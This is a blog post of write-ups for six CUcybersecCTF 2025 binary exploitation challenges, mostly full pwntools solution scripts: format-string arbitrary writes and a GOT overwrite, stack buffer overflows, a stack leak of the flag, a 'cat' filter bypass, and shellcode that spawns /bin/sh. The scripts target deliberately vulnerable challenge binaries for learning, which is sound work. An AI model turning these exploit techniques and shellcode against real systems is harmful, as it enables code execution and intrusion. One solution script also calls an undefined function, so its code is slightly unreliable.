---
title: CUcybersecCTF 2025 Binary Exploitation
description: Writeups for CUcybersecCTF 2025 binary exploitation challenges
date: 2025-10-28 14:00:00 -0700
categories: [CTF]
tags: [CUcybersecCTF, Binary Exploitation, Writeup]
---


## **1. Alpha-7 Format Override**
---
### Overview 

- **Category**: Format string bug
- **Difficulty**: Easy (2/10)
- **Challenge Files**: `format1.c`, `format1`


### Exploitation Steps 
#### Analysis
As always, start by examining the binary's security properties using checksec. 
```bash
$ checksec
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Good news is the PIE is disable, so the binary loads at a fixed base address, making things a lot easier.
By reviewing the source code, reveals a classic format string vulnerability at line 18, where user input is passed directly to `printf` without a format specifier. Here's also a global variable `security_code` initialized to `0x21646f63`. At line 22, an `if` statement checks if `security_code` equals to `0x64657461`, if true we get the flag. Our goal is to overwrite `security_code` with `0x64657461` via the format string bug.

#### Find the offset
Spam input like `%p %p %p %p ...` and count the outputs until you spot printable ASCII strings resembling your input. This offset tells you where your payload starts controlling memory.

#### Find the Target Address
There are many ways to find the address of `security_code`. You can use `gdb`, `nm` or a pwntools function to find it. If you not farmiliar with pwntools, try using `nm` or `gdb`.

This tool will also make your exploit much more readable.
```python
addr = elf.sym["security_code"]
```

But for beginners I recommend using this. 
```bash
nm format1 | grep "security_code"
```

#### Craft the Payload
> For beginners, manually crafting the payload a few times before using `fmtstr_payload()` help you to understand this technique.
{: .prompt-info}

This is manual way to craft the payload. 


```python
def manual_payload():
    # address of security code
    # or you can use 'nm format1 | grep "security_code"' command to get the address
    #dest = 0x404050
    dest = elf.sym["security_code"]
    #val  = 0x64657461

    # 4 bytes -- xxxxxxxx    index                                  (0x00 written)
    payload  = b'%93c----'   # 14   93  = 0x61 - 0x00 - 4           (0x61 written)
    payload += b'%21$hhn-'   # 15   write 0x61 on index 21          (0x62 written)
    payload += b'%14c----'   # 16   14  = 0x74 - 0x62 - 4           (0x74 written) 
    payload += b'%22$hhn-'   # 17   write 0x74 on index 22          (0x75 written)
    payload += b'%236c---'   # 18   236 = 0x64 + 0x100 - 0x75 - 3   (0x164 written)(overflow)
    payload += b'%24$hhn-'   # 19   write 0x64 on index 24          (0x165 written)(overflow)
    payload += b'%23$hhn-'   # 20   write 0x65 on index 23          (done)
    payload += p64(dest)     # 21
    payload += p64(dest + 1) # 22
    payload += p64(dest + 2) # 23
    payload += p64(dest + 3) # 24

    return payload
```

This is the faster and better way to build the payload.

```python
def auto_payload():
    # address of security code
    # or you can use 'nm format1 | grep "security_code"' command to get the address
    #dest = 0x404050
    dest = elf.sym["security_code"]
    val  = 0x64657461

    write = {
            dest : val
            }
    
    # adjust the write size if it is not working (byte, short, int)
    payload = fmtstr_payload(14, write, write_size="byte")

    return payload
```


### Solution
```python
#!/usr/bin/env python3

from pwn import *
import time

elf = ELF("./format1_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""


def conn():
    if args.REMOTE:
        r = remote("34.130.180.230", 5675)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r



def manual_payload():
    # address of security code
    # or you can use 'nm format1 | grep "security_code"' command to get the address
    #dest = 0x404050
    dest = elf.sym["security_code"]
    #val  = 0x64657461

    # 4 bytes -- xxxxxxxx    index                                (0x00 written)
    payload  = b'%93c----'   # 14   93  = 0x61 - 0x00 - 4         (0x61 written)
    payload += b'%21$hhn-'   # 15   write 0x61 on index 21        (0x62 written)
    payload += b'%14c----'   # 16   14  = 0x74 - 0x62 - 4         (0x74 written) 
    payload += b'%22$hhn-'   # 17   write 0x74 on index 22        (0x75 written)
    payload += b'%236c---'   # 18   236 = 0x64 + 0x100 - 0x75 - 3 (0x164 written)(overflow)
    payload += b'%24$hhn-'   # 19   write 0x64 on index 24        (0x165 written)(overflow)
    payload += b'%23$hhn-'   # 20   write 0x65 on index 23        (done)
    payload += p64(dest)     # 21
    payload += p64(dest + 1) # 22
    payload += p64(dest + 2) # 23
    payload += p64(dest + 3) # 24

    return payload



def auto_payload():
    # address of security code
    # or you can use 'nm format1 | grep "security_code"' command to get the address
    #dest = 0x404050
    dest = elf.sym["security_code"]
    val  = 0x64657461

    write = {
            dest : val
            }
    
    # adjust the write size if it is not working (byte, short, int)
    payload = fmtstr_payload(14, write, write_size="byte")

    return payload



def main():
    r = conn()

    #payload = auto_payload()
    payload = manual_payload()

    # send the payload
    r.sendline(payload)

    # large payload, gonna take some time
    # adjust sleep time if needed
    log.progress("Sending...")
    sleep(1)

    # discard all the garbage
    r.recvuntil(b'CLASSIFIED DATA: ')

    flag = r.recvuntil(b'}').decode("ascii")

    print()
    print(flag)
    print()


if __name__ == "__main__":
    main()
```


### Extra
If you want to show some disrespect to the challenge author, skip the `security_code` entirely and target the Global Offset Table. Since RELRO is partial, overwriting the got entry is doable.
```python
#!/usr/bin/env python3

from pwn import *
import time

elf = ELF("./format1_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""


def conn():
    if args.REMOTE:
        r = remote("34.130.180.230", 5675)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    dest = elf.got["fflush"]
    val  = 0x4012e5 

    write = {
            dest : val
            }
    
    offset = 14

    payload = fmtstr_payload(offset, write, write_size="byte")

    r.sendline(payload)

    log.progress("Sending...")
    sleep(1)

    r.recvuntil(b'CLASSIFIED DATA: ')

    flag = r.recvuntil(b'}').decode("ascii")

    print()
    print(flag)
    print()


if __name__ == "__main__":
    main()
```
<br>
<br>




## **2. Deep Sea Exploitation**
---
### Overview 

- **Category**: Bash
- **Difficulty**: Trivial (1/10)
- **Challenge Files**: `deepsea.c`, `deepsea`

### Exploitation Steps 
#### Analysis
This challenge is not about exploiting the binary. The goal is to locate the flag file and find a way to read its contents.

#### Locate the flag file
After some exploration, the flag file is easily found at `/app/flag.txt`.

#### Find a way to read the flag file
The `cat` command is blocked, but its reverse counterpart `tac` is not. We can read the file with `tac` and then reverse the output again to restore the original order.

### Solution

```bash
probe && tac /app/flag.txt | tac
```



<br>
<br>




## **3. Neural Pattern Analysis**
---
### Overview 

- **Category**: Format string bug
- **Difficulty**: Trivial (1/10)
- **Challenge Files**: `neural.c`, `neural`

### Exploitation Steps 
#### Analysis
Another format string bug challenge. But this time the flag is already in the memory. Lets checksec it first:
```bash
$checksec
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Holy moly, the binary basically has ZERO meaningful protection.
You could:
- Simpily leak the flag directly from memory
- Leak the libc address and call `system(“/bin/sh”)`
- Write your own shellcode and return to it

This isn’t just a CTF challenge, this is literally a hacker’s wet dream.

Here I gonna show you the intended solution.

#### Leak Everything on the Stack
We use a script to brute-force print stack values using `%p` format specifiers

```python
def print_stack(n):
    context.log_level = "ERROR"
    leak = ""
    for i in range(n//10):
        r = conn()
        payload = b''
        for j in range(i*10+1,i*10+11):
            payload += f"%{j}$p|".encode("ascii")
        payload += b'*'
        r.sendlineafter(b'>>', payload)
        r.recvuntil(b'Pattern decoded as - \n')
        leak += r.recvuntil(b'*', drop=True).decode("ascii")
        r.clean()
        r.close()
    context.log_level = "INFO"
    leak = leak.split("|")
    for i in range(len(leak)-1):
        print(f"{i+1:>3}: {leak[i]}")
```

The output of `print_stack(50)` is shown below.

```bash
  1: 0xff8de1d0
  2: 0xffffffff
  3: 0xf7ced8dc
  4: 0x70243125
  5: 0x2432257c
  6: 0x33257c70
  7: 0x257c7024
  8: 0x7c702434
  9: 0x70243525
 10: 0x2436257c
 11: 0x31257c70
 12: 0x7c702436
 13: 0x24373125
 14: 0x31257c70
 15: 0x7c702438
 16: 0x24393125
 17: 0x32257c70
 18: 0x7c702430
 19: 0xf7f6002a
 20: 0xff96dc90
 21: 0xf7f09c44
 22: 0xf7ec76b0
 23: 0x1
 24: 0x1
 25: (nil)
 26: 0xf7ec76b0
 27: 0x1
 28: 0xf7f08fec
 29: (nil)
 30: 0x8048300
 31: 0x804c028
 32: 0x50
 33: 0x8048488
 34: 0x8048300
 35: 0x804c00c
 36: 0x67616c66
 37: 0x6572547b
 38: 0x7d65
 39: 0xf7e07256
 40: 0xf7d0952c
 41: 0xf7e9ae0c
 42: (nil)
 43: 0x804bf04
 44: 0xffa4ac18
 45: 0xf7f02fb0
 46: (nil)
 47: 0xe2a11e00
 48: 0x3e8
 49: 0xf7e9ae0c
 50: (nil)
```
There are some funny looking numbers on 36, 37 and 38. These are pieces of the flag of this challenge.

#### Make some modification to the script

As a lazy person I prefer using script to convert the flag from ascii looking numbers to actual string.
So I made some modification to the original code:

```python
def find_flag(n):
    context.log_level = "ERROR"
    leak = ""
    for i in range(n//10):
        r = conn()
        payload = b''
        for j in range(i*10+1,i*10+11):
            payload += f"%{j}$p|".encode("ascii")
        payload += b'*'
        r.sendlineafter(b'>>', payload)
        r.recvuntil(b'Pattern decoded as - \n')
        leak += r.recvuntil(b'*', drop=True).decode("ascii")
        r.clean()
        r.close()
    context.log_level = "INFO"

    leak = leak.split("|")
    flag = ''
    for i in range(len(leak)-1):
        try:
            l = p32(int(leak[i],16)).decode("ascii")
        except:
            l = ''
        flag += l
    try:
        flag = flag[flag.index("flag") : flag.index("}")+1]
    except:
        log.failure("No Flag, n need to be larger, or change the flag header")
        return ""

    return flag
```

This function just simpily returns the flag.

### Solution

```python
#!/usr/bin/env python3

from pwn import *
import time

elf = ELF("./neural_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""


def conn():
    if args.REMOTE:
        r = remote("34.130.180.230", 6833)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def find_flag(n):
    context.log_level = "ERROR"
    leak = ""
    for i in range(n//10):
        r = conn()
        payload = b''
        for j in range(i*10+1,i*10+11):
            payload += f"%{j}$p|".encode("ascii")
        payload += b'*'
        r.sendlineafter(b'>>', payload)
        r.recvuntil(b'Pattern decoded as - \n')
        leak += r.recvuntil(b'*', drop=True).decode("ascii")
        r.clean()
        r.close()
    context.log_level = "INFO"

    leak = leak.split("|")
    flag = ''
    for i in range(len(leak)-1):
        try:
            l = p32(int(leak[i],16)).decode("ascii")
        except:
            l = ''
        flag += l
    try:
        flag = flag[flag.index("flag") : flag.index("}")+1]
    except:
        log.failure("No Flag, n need to be larger, or change the flag header")
        return ""


    return flag


def main():
    print_stack(50)
    flag = find_flag(50)

    print()
    print(flag)
    print()


if __name__ == "__main__":
    main()
```


<br>
<br>



## **4. Nexus Corp Override**
---
### Overview 

- **Category**: Stack buffer overflow
- **Difficulty**: Trivial (1/10)
- **Challenge Files**: `overflow1.c`, `overflow1`

### Exploitation Steps 
#### Analysis
Not much to say, the easiest type of binary exploitation challenge. The solution is fill up the buffer `employee_id` with garbage and overwrite variable `clearance_level` with `0x1337`.

#### Done
That is it. Just see the solution.

### Solution

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./overflow1_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""


def find_offset():
    r = process([elf.path])
    gdb.attach(r)
    p = cyclic(1000)
    r.sendline(p)
    r.interactive()


def conn():
    if args.REMOTE:
        r = remote("34.66.146.178", 9653)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    offset = 40 * b'i'
    win = elf.sym["unlock_credentials"]

    payload = offset + p32(win)

    r.sendline(payload)
    r.recvuntil(b'CREDENTIALS UNLOCKED: ')

    flag = r.recvuntil(b'\n')
    print()
    print(flag)
    print()
    

if __name__ == "__main__":
    main()
```




<br>
<br>



## **5. Orbital Station Override**
---
### Overview 

- **Category**: Bash
- **Difficulty**: Trivial (1/10)
- **Challenge Files**: `mine.c`, `mine_challenge`

### Exploitation Steps 
#### Analysis
Same challenge as Nexus Corp Override, but with some noises. The solution is fill up the `databank` buffer, overwrite variable `guardian`, and overwrite `clearance` with `0xff`.

#### Done
That is it. Just see the solution.

### Solution

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./mine_challenge_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""


def conn():
    if args.REMOTE:
        r = remote("34.122.158.24", 6962)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    guardian = 0x4B434148

    r.clean()

    payload = b'i'*64 + p32(guardian) + b'\xff'

    r.sendline(payload)
    r.recvuntil(b'Access granted! Launching escape pod with classified data!\n')
    flag = r.recvuntil(b'\n', drop=True).decode("ascii")
    r.clean()
    r.close()

    print()
    print(flag)
    print()
    

if __name__ == "__main__":
    main()
```


<br>
<br>




## **6. Mission Control Malfunction**
---

> This challenge deserves its own blog post, I will write it ASAP.
{: .prompt-info}

### Overview 

- **Category**: Shellcode, Stack buffer overflow
- **Difficulty**: Extreme (6/10)
- **Challenge Files**: `handoff.c`, `handoff`

### Analysis and Steps

This challenge have no difference with handoff from picoCTF 2025 in terms of techniques and binary structure.

### Solution 1 (My Solution)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./handoff_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
b vuln
b *0x4013d0
b *0x4013ac
c
"""

def conn():
    if args.REMOTE:
        r = remote("34.66.146.178", 7587)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    # a readable writable address for "/bin/sh\0"
    binsh = 0x404048

    # gadget from God
    jmp_rax = 0x4011ae

    # shellcode (I tried my best to make it only 40 bytes long ;) )
    #     read(stdin, binsh, 8);
    #     execve(binsh, NULL, NULL);
    shellcode = asm(f"""
                    xor rdi, rdi;
                    mov rsi, {binsh};
                    mov rdx, 8;
                    xor rax, rax;
                    syscall;
                    mov rdi, rsi;
                    xor rsi, rsi;
                    xor rdx, rdx;
                    mov rax, 59;
                    syscall;
                    """)

    # Send a message to a recipient
    r.sendlineafter(b'Exit mission control', b'2')

    # negative index bug, unpredictable things will happen if the index is negative
    # fgets will buffer overflow its own stack
    r.sendlineafter(b'send a transmission to?', b'-1')

    # write shellcode on stack and execute 
    # rax is pointing at the beginning of shellcode 
    # (the shellcode must be less than or equal to 40 bytes)
    payload = shellcode + p64(jmp_rax)

    # send the payload
    r.sendlineafter(b'like to send them?', payload)

    # SYS_read is invoked. write /bin/sh on 0x404048
    r.sendline(b'/bin/sh\0')

    # SYS_execve is invoked and enjoy the shell privilege
    r.interactive()
    
    

if __name__ == "__main__":
    main()
```

### Solution 2 (Common Solution)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./handoff_patched")

context.binary = elf
context.arch = "amd64"
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
b *0x4013e8
c
"""

def conn():
    if args.REMOTE:
        r = remote("addr", 1337)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r



nop = lambda n : b'\x90' * n

def main():
    r = conn()

    # gadget from God
    jmp_rax = 0x4011ae

    # shellcode catching net
    shellcode_catch = nop(20) 

    # shellcode jump to execve
    shellcode_jmp    = asm("""
                           sub rax, 0x2d4 - 8;
                           jmp rax;
                           """)

    # shellcode execve
    shellcode_execve = asm("""
                           mov rdi, rax;
                           add rdi, 50;
                           xor rsi, rsi;
                           xor rdx, rdx;
                           mov rax, 59
                           syscall;
                           """).ljust(50, b'\x90') + b'/bin/sh\0'


    #print(shellcode_jmp)
    #exit()

    # payload
    # because 8th byte will be replaced with 0, we need to shift the shellcode a little bit 
    payload_jmp = (nop(3) + shellcode_jmp).ljust(20, b'\x90') + p64(jmp_rax)



    # Name doesn't really matter a lot, fill up with nop just in case 
    r.recvuntil(b'Exit mission control')
    r.sendline(b'1')

    r.recvuntil(b"What's the new crew member's callsign: ")
    r.sendline(shellcode_catch)



    # Write shellcode on stack
    r.recvuntil(b'Exit mission control')
    r.sendline(b'2')

    r.recvuntil(b'Which crew member would you like to send a transmission to?')
    r.sendline(b'0')

    r.recvuntil(b'What transmission would you like to send them?')
    r.sendline(shellcode_execve)



    # jump to beginning of feedback and execute
    r.recvuntil(b'Exit mission control')
    r.sendline(b'3')
    r.recvuntil(b'Thank you for using mission control! If you could take a second to write a quick mission report, we would really appreciate it: ')
    r.sendline(payload_jmp)


    # enjoy the shell
    r.interactive()
    
    

if __name__ == "__main__":
    main()
```



<br>
<br>


